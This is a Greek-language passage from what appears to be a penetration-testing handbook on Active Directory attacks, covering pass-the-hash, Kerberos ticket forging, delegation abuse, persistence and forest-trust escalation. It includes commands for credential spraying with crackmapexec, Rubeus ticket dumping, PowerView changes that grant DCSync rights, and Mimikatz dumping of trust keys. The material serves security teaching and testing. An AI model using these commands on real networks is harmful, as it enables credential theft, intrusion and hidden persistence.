Υπάρχει μια πλήρης σελίδα σε αυτό το βιβλίο σχετικά με [**local privilege escalation στα Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσετε να χρησιμοποιήσετε το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Είναι πολύ **απίθανο** να βρείτε **tickets** στον τρέχοντα user που να σας **δίνουν permission για access** σε απρόσμενα resources, αλλά μπορείτε να ελέγξετε:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Εάν έχετε καταφέρει να κάνετε enumerate το Active Directory, θα έχετε **περισσότερα emails και καλύτερη κατανόηση του δικτύου**. Ίσως μπορέσετε να προκαλέσετε [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** μέσω NTLM.**

### Αναζήτηση για Creds σε Computer Shares | SMB Shares

Τώρα που έχετε κάποια βασικά credentials, θα πρέπει να ελέγξετε αν μπορείτε να **βρείτε** **ενδιαφέροντα αρχεία που διαμοιράζονται μέσα στο AD**. Θα μπορούσατε να το κάνετε χειροκίνητα, αλλά είναι μια πολύ βαρετή επαναλαμβανόμενη εργασία (και ακόμη περισσότερο αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε σχετικά με εργαλεία που θα μπορούσατε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Εάν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF), τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **πυροδοτήσουν μια NTLM authentication προς εσάς**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** και να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated user να **παραβιάσει τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation στο Active Directory ΜΕ privileged credentials/session

**Για τις ακόλουθες τεχνικές, ένας κανονικός domain user δεν επαρκεί· χρειάζεστε ορισμένα ειδικά privileges/credentials για να εκτελέσετε αυτές τις επιθέσεις.**

### Hash extraction

Ας ελπίσουμε ότι έχετε καταφέρει να **παραβιάσετε κάποιον local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [κλιμακώνοντας τα privileges τοπικά](../windows-local-privilege-escalation/index.html).\
Στη συνέχεια, είναι η ώρα να κάνετε dump όλα τα hashes από τη μνήμη και τοπικά.\
[**Διαβάστε αυτήν τη σελίδα σχετικά με διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις αποκτήσετε το hash ενός user**, μπορείτε να το χρησιμοποιήσετε για να **τον impersonate**.\
Πρέπει να χρησιμοποιήσετε κάποιο **tool** που θα **εκτελέσει** την **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** θα μπορούσατε να δημιουργήσετε ένα νέο **sessionlogon** και να **κάνετε inject** αυτό το **hash** μέσα στο **LSASS**, ώστε, όταν εκτελείται οποιαδήποτε **NTLM authentication**, να χρησιμοποιείται αυτό το **hash**. Η τελευταία επιλογή είναι αυτή που κάνει το mimikatz.\
[**Διαβάστε αυτήν τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στη **χρήση του NTLM hash του user για την αίτηση Kerberos tickets**, ως εναλλακτική της συνηθισμένης διαδικασίας Pass The Hash μέσω του NTLM protocol. Επομένως, αυτό μπορεί να είναι ιδιαίτερα **χρήσιμο σε δίκτυα όπου το NTLM protocol είναι απενεργοποιημένο** και επιτρέπεται μόνο το **Kerberos** ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι attackers **κλέβουν το authentication ticket ενός user** αντί για τον κωδικό πρόσβασης ή τις τιμές hash του. Αυτό το κλεμμένο ticket χρησιμοποιείται στη συνέχεια για να **κάνουν impersonate τον user**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε resources και services μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Εάν έχετε το **hash** ή το **password** ενός **local administrator**, θα πρέπει να προσπαθήσετε να κάνετε **login τοπικά** σε άλλους **υπολογιστές** χρησιμοποιώντας το.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **θορυβώδες** και το **LAPS** θα το **μετρίαζε**.

### Κατάχρηση MSSQL και Trusted Links

Αν ένας χρήστης έχει δικαιώματα **πρόσβασης σε MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για **εκτέλεση εντολών** στο MSSQL host (αν εκτελείται ως SA), για **κλοπή** του NetNTLM **hash** ή ακόμη και για εκτέλεση **relay** **attack**.\
Επίσης, αν ένα MSSQL instance είναι trusted (database link) από ένα διαφορετικό MSSQL instance και ο χρήστης έχει δικαιώματα στην trusted database, θα μπορεί να **χρησιμοποιήσει τη σχέση trust για να εκτελεί queries και στο άλλο instance**. Αυτά τα trusts μπορούν να συνδεθούν μεταξύ τους και, κάποια στιγμή, ο χρήστης μπορεί να εντοπίσει μια κακώς ρυθμισμένη database όπου μπορεί να εκτελέσει εντολές.\
**Οι σύνδεσμοι μεταξύ databases λειτουργούν ακόμη και μέσω forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Κατάχρηση IT asset/deployment platforms

Οι third-party inventory και deployment suites συχνά εκθέτουν ισχυρές διαδρομές προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν εντοπίσετε οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain privileges στον υπολογιστή, θα μπορείτε να κάνετε dump τα TGTs από τη μνήμη κάθε χρήστη που συνδέεται στον υπολογιστή.\
Επομένως, αν ένας **Domain Admin συνδεθεί στον υπολογιστή**, θα μπορείτε να κάνετε dump το TGT του και να τον κάνετε impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation, θα μπορούσατε ακόμη και να **παραβιάσετε αυτόματα έναν Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής επιτρέπεται για "Constrained Delegation", θα μπορεί να **κάνει impersonate οποιονδήποτε χρήστη για πρόσβαση σε ορισμένες υπηρεσίες ενός υπολογιστή**.\
Στη συνέχεια, αν **παραβιάσετε το hash** αυτού του χρήστη/υπολογιστή, θα μπορείτε να **κάνετε impersonate οποιονδήποτε χρήστη** (ακόμη και domain admins) για πρόσβαση σε ορισμένες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή δικαιώματος **WRITE** σε ένα Active Directory object ενός απομακρυσμένου υπολογιστή επιτρέπει την απόκτηση code execution με **αυξημένα δικαιώματα**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Κατάχρηση Permissions/ACLs

Ο παραβιασμένος χρήστης μπορεί να έχει κάποια **ενδιαφέροντα δικαιώματα σε ορισμένα domain objects**, τα οποία θα μπορούσαν να σας επιτρέψουν να κάνετε αργότερα **lateral movement**/**privilege escalation**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Κατάχρηση της υπηρεσίας Printer Spooler

Η ανακάλυψη μιας **Spool service που ακούει** μέσα στο domain μπορεί να γίνει **αντικείμενο κατάχρησης** για την **απόκτηση νέων credentials** και το **privilege escalation**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Κατάχρηση third-party sessions

Αν **άλλοι χρήστες** **έχουν πρόσβαση** στο **παραβιασμένο** μηχάνημα, είναι πιθανό να **συλλέξετε credentials από τη μνήμη** και ακόμη και να **εισάγετε beacons στις διεργασίες τους** για να τους κάνετε impersonate.\
Συνήθως οι χρήστες αποκτούν πρόσβαση στο σύστημα μέσω RDP, επομένως εδώ θα βρείτε τον τρόπο εκτέλεσης δύο attacks σε third-party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα διαχείρισης του **κωδικού πρόσβασης του local Administrator** σε domain-joined υπολογιστές, διασφαλίζοντας ότι είναι **τυχαίος**, μοναδικός και **αλλάζει** συχνά. Αυτοί οι κωδικοί αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο για εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα πρόσβασης σε αυτούς τους κωδικούς, καθίσταται δυνατή η μετακίνηση σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Κλοπή Certificates

Η **συλλογή certificates** από το παραβιασμένο μηχάνημα θα μπορούσε να αποτελέσει τρόπο για privilege escalation στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Κατάχρηση Certificate Templates

Αν έχουν ρυθμιστεί **ευάλωτα templates**, είναι δυνατή η κατάχρησή τους για privilege escalation:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation με λογαριασμό υψηλών δικαιωμάτων

### Dumping Domain Credentials

Μόλις αποκτήσετε δικαιώματα **Domain Admin** ή, ακόμη καλύτερα, **Enterprise Admin**, μπορείτε να κάνετε **dump** τη **βάση δεδομένων του domain**: _ntds.dit_.

[**Περισσότερες πληροφορίες σχετικά με το DCSync attack μπορείτε να βρείτε εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες σχετικά με την κλοπή του NTDS.dit μπορείτε να βρείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Ορισμένες από τις τεχνικές που αναφέρθηκαν προηγουμένως μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσατε να:

- Κάνετε τους χρήστες ευάλωτους σε [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Κάνετε τους χρήστες ευάλωτους σε [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Παραχωρήσετε δικαιώματα [**DCSync**](#dcsync) σε έναν χρήστη

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Το **Silver Ticket attack** δημιουργεί ένα **νόμιμο Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία, χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για **πρόσβαση στα service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ένα **Golden Ticket attack** περιλαμβάνει την απόκτηση από έναν attacker του **NTLM hash του λογαριασμού krbtgt** σε ένα περιβάλλον Active Directory (AD). Αυτός ο λογαριασμός είναι ειδικός, επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για authentication μέσα στο AD network.

Μόλις ο attacker αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets, αλλά έχουν πλαστογραφηθεί με τρόπο που **παρακάμπτει τους συνήθεις μηχανισμούς ανίχνευσης golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence μέσω Certificates Account**

**Η κατοχή certificates ενός account ή η δυνατότητα αίτησής τους** είναι ένας πολύ καλός τρόπος για να διατηρήσετε persistence στον λογαριασμό του χρήστη (ακόμη και αν αλλάξει τον κωδικό πρόσβασής του):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence μέσω Certificates Domain**

**Η χρήση certificates επιτρέπει επίσης τη διατήρηση persistence με υψηλά δικαιώματα μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το object **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως τα Domain Admins και Enterprise Admins), εφαρμόζοντας μια τυπική **Access Control List (ACL)** σε αυτές τις ομάδες, ώστε να αποτρέπονται μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να γίνει αντικείμενο εκμετάλλευσης: αν ένας attacker τροποποιήσει την ACL του AdminSDHolder ώστε να παραχωρήσει πλήρη πρόσβαση σε έναν κανονικό χρήστη, ο χρήστης αυτός αποκτά εκτεταμένο έλεγχο σε όλες τις privileged groups. Έτσι, αυτό το μέτρο ασφαλείας μπορεί να έχει το αντίθετο αποτέλεσμα, επιτρέποντας μη δικαιολογημένη πρόσβαση, εκτός αν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για το AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Μέσα σε κάθε **Domain Controller (DC)** υπάρχει ένας λογαριασμός **local administrator**. Με την απόκτηση δικαιωμάτων admin σε ένα τέτοιο μηχάνημα, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας το **mimikatz**. Στη συνέχεια, απαιτείται τροποποίηση του registry για την **ενεργοποίηση της χρήσης αυτού του κωδικού**, επιτρέποντας απομακρυσμένη πρόσβαση στον local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Θα μπορούσατε να **παραχωρήσετε** ορισμένα **ειδικά δικαιώματα** σε έναν **χρήστη** πάνω σε συγκεκριμένα domain objects, επιτρέποντας στον χρήστη να **κάνει privilege escalation στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για την **αποθήκευση** των **δικαιωμάτων** που έχει ένα **object** πάνω σε **ένα object**. Αν μπορείτε να **κάνετε** ακόμη και μια **μικρή αλλαγή** στο **security descriptor** ενός object, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα δικαιώματα πάνω σε αυτό το object, χωρίς να χρειάζεται να είστε μέλος μιας privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Κάντε κατάχρηση της auxiliary class `dynamicObject` για να δημιουργήσετε βραχύβια principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`. Αυτά διαγράφονται αυτόματα χωρίς tombstones, εξαλείφοντας evidence από το LDAP, ενώ αφήνουν orphan SIDs, broken `gPLink` references ή cached DNS responses (π.χ. μόλυνση ACE του AdminSDHolder ή κακόβουλα `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να δημιουργήσετε έναν **universal password**, παρέχοντας πρόσβαση σε όλους τους domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **συλλαμβάνετε** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο μηχάνημα.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **προωθεί attributes** (SIDHistory, SPNs...) σε καθορισμένα objects, **χωρίς να αφήνει logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα **DA** και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να κάνετε privilege escalation αν έχετε **επαρκή δικαιώματα για την ανάγνωση των LAPS passwords**. Ωστόσο, αυτοί οι κωδικοί μπορούν επίσης να χρησιμοποιηθούν για τη **διατήρηση persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το security boundary. Αυτό σημαίνει ότι η **παραβίαση ενός domain θα μπορούσε δυνητικά να οδηγήσει στην παραβίαση ολόκληρου του Forest**.<sup>[[1]](#references)</sup>

### Βασικές πληροφορίες

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν χρήστη από ένα **domain** να αποκτά πρόσβαση σε resources ενός άλλου **domain**. Ουσιαστικά δημιουργεί μια σύνδεση μεταξύ των authentication systems των δύο domains, επιτρέποντας την ομαλή ροή των authentication verifications. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας χρήστης θέλει να αποκτήσει πρόσβαση σε μια υπηρεσία ενός **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket, γνωστό ως **inter-realm TGT**, από το DC του δικού του domain. Αυτό το TGT κρυπτογραφείται με ένα κοινόχρηστο **key** που έχουν συμφωνήσει και τα δύο domains. Στη συνέχεια, ο χρήστης παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μετά την επιτυχή επικύρωση του inter-realm TGT από τον DC του trusted domain, εκδίδεται ένα TGS που παρέχει στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει ένα νέο TGT αν ο client authenticated successfully.
3. Στη συνέχεια, ο client ζητά ένα **inter-realm TGT** από τον DC1, το οποίο απαιτείται για την πρόσβαση σε resources του **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** που μοιράζονται οι DC1 και DC2 στο πλαίσιο του two-way domain trust.
5. Ο client μεταφέρει το inter-realm TGT στον **Domain Controller (DC2) του Domain 2**.
6. Ο DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινόχρηστο trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 στον οποίο θέλει να αποκτήσει πρόσβαση ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι κρυπτογραφημένο με το hash του account του server, για να αποκτήσει πρόσβαση στην υπηρεσία του Domain 2.

### Διαφορετικά trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι μονόδρομο ή αμφίδρομο**. Στην αμφίδρομη επιλογή, και τα δύο domains εμπιστεύονται το ένα το άλλο, ενώ στη **μονόδρομη** σχέση trust ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να αποκτήσετε πρόσβαση σε resources μέσα στο trusting domain μόνο από το trusted domain**.

Αν το Domain A εμπιστεύεται το Domain B, το A είναι το trusting domain και το B είναι το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**, ενώ στο **Domain B** θα είναι ένα **Inbound trust**.

**Διαφορετικές σχέσεις trust**

- **Parent-Child Trusts**: Πρόκειται για συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα ένα two-way transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν ομαλά μεταξύ parent και child.
- **Cross-link Trusts**: Γνωστά ως "shortcut trusts", δημιουργούνται μεταξύ child domains για την επιτάχυνση των referral processes. Σε σύνθετα forests, τα authentication referrals συνήθως πρέπει να κινηθούν προς το forest root και στη συνέχεια προς τα κάτω, μέχρι το target domain. Με τη δημιουργία cross-links, η διαδρομή συντομεύεται, κάτι ιδιαίτερα χρήσιμο σε γεωγραφικά κατανεμημένα περιβάλλοντα.
- **External Trusts**: Ρυθμίζονται μεταξύ διαφορετικών, μη συσχετιζόμενων domains και είναι από τη φύση τους non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για την πρόσβαση σε resources ενός domain εκτός του τρέχοντος forest, το οποίο δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νέου tree root. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και διασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες μπορείτε να βρείτε στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains και επιβάλλει επίσης SID filtering για την ενίσχυση των μέτρων ασφαλείας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι πιο εξειδικευμένα και προορίζονται για περιβάλλοντα που απαιτούν integration με Kerberos-based systems εκτός του Windows ecosystem.

#### Άλλες διαφορές στις **trusting relationships**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (το A εμπιστεύεται το B, το B εμπιστεύεται το C, άρα το A εμπιστεύεται το C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (και τα δύο εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Attack Path

1. **Enumerate** τις trusting relationships
2. Ελέγξτε αν κάποιο **security principal** (user/group/computer) έχει **πρόσβαση** σε resources του **άλλου domain**, ίσως μέσω ACE entries ή επειδή ανήκει σε groups του άλλου domain. Αναζητήστε **relationships μεταξύ domains** (πιθανότατα για αυτό δημιουργήθηκε το trust).
1. Το kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι μια ακόμη επιλογή.
3. **Compromise** τα **accounts** που μπορούν να κάνουν **pivot** μεταξύ domains.

Attackers με πρόσβαση σε resources ενός άλλου domain μέσω trust μπορούν να χρησιμοποιήσουν τρεις βασικούς μηχανισμούς:

- **Local Group Membership**: Principals μπορεί να έχουν προστεθεί σε local groups σε μηχανήματα, όπως το “Administrators” group ενός server, παρέχοντάς τους σημαντικό έλεγχο σε αυτό το μηχάνημα.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι μέλη groups μέσα στο foreign domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope του group.
- **Access Control Lists (ACLs)**: Principals μπορεί να καθορίζονται σε ένα **ACL**, ιδιαίτερα ως entities σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένα resources. Για όσους θέλουν να εμβαθύνουν στους μηχανισμούς των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” αποτελεί πολύτιμη πηγή.<sup>[[17]](#references)</sup>

### Εύρεση external users/groups με permissions

Μπορείτε να ελέγξετε το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να εντοπίσετε foreign security principals στο domain. Αυτοί θα είναι user/group από **external domain/forest**.

Μπορείτε να το ελέγξετε στο **Bloodhound** ή χρησιμοποιώντας το powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Κλιμάκωση προνομίων σε forest από Child σε Parent
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για την απαρίθμηση των domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, ένα για _Child --> Parent_ και ένα ακόμη για _Parent_ --> _Child_.\
> Μπορείτε να δείτε αυτό που χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Κάντε escalation ως Enterprise admin στο child/parent domain εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Η κατανόηση του τρόπου με τον οποίο μπορεί να γίνει exploit στο Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό repository για configuration data σε ολόκληρο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα γίνονται replicate σε κάθε Domain Controller (DC) μέσα στο forest, ενώ οι writable DCs διατηρούν ένα writable αντίγραφο του Configuration NC. Για να γίνει exploit αυτό, απαιτούνται **SYSTEM privileges σε έναν DC**, κατά προτίμηση σε child DC.

**Link GPO στο root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των domain-joined υπολογιστών μέσα στο AD forest. Με SYSTEM privileges σε οποιονδήποτε DC, οι attackers μπορούν να κάνουν link GPOs στα root DC sites. Αυτή η ενέργεια μπορεί να compromize το root domain μέσω manipulation των policies που εφαρμόζονται σε αυτά τα sites.

Για αναλυτικότερες πληροφορίες, μπορεί κανείς να μελετήσει έρευνα σχετικά με το [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise οποιουδήποτε gMSA στο forest**

Ένα attack vector περιλαμβάνει τη στόχευση privileged gMSAs μέσα στο domain. Το KDS Root key, που είναι απαραίτητο για τον υπολογισμό των passwords των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges σε οποιονδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των passwords οποιουδήποτε gMSA σε ολόκληρο το forest.

Λεπτομερής ανάλυση και step-by-step guidance είναι διαθέσιμα στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, περιμένοντας τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας attacker μπορεί να τροποποιήσει το AD Schema ώστε να παραχωρήσει σε οποιονδήποτε user πλήρη έλεγχο σε όλες τις classes. Αυτό θα μπορούσε να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο των νεοδημιουργημένων AD objects.

